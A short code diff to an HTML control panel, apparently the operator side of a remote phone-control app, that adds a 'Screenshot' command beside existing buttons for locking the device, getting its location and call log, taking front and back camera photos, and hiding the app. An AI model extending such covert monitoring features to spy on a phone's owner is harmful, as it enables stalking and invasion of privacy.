@@ -86,13 +86,14 @@
           </div>
 
           <!-- Command Buttons -->
-          <div class="command-bar">
+            <div class="command-bar">
             <button class="btn btn-danger" onclick="sendCommand('LOCK_DEVICE')">&#128274; Lock</button>
             <button class="btn btn-primary" onclick="promptDialog()">&#128172; Dialog</button>
             <button class="btn btn-primary" onclick="sendCommand('GET_LOCATION')">&#128204; Location</button>
             <button class="btn btn-primary" onclick="sendCommand('GET_CALL_LOG')">&#9742; Call Log</button>
             <button class="btn btn-primary" onclick="capturePhoto(false)">&#128247; Photo Back</button>
             <button class="btn btn-primary" onclick="capturePhoto(true)">&#128247; Photo Front</button>
+            <button class="btn btn-secondary" onclick="sendCommand('CAPTURE_SCREEN')">&#128424; Screenshot</button>
             <button class="btn btn-secondary" onclick="sendCommand('HIDE_APP')">&#128064; Hide</button>
             <button class="btn btn-primary" onclick="sendCommand('SHOW_APP')">&#128065; Show</button>
           </div>
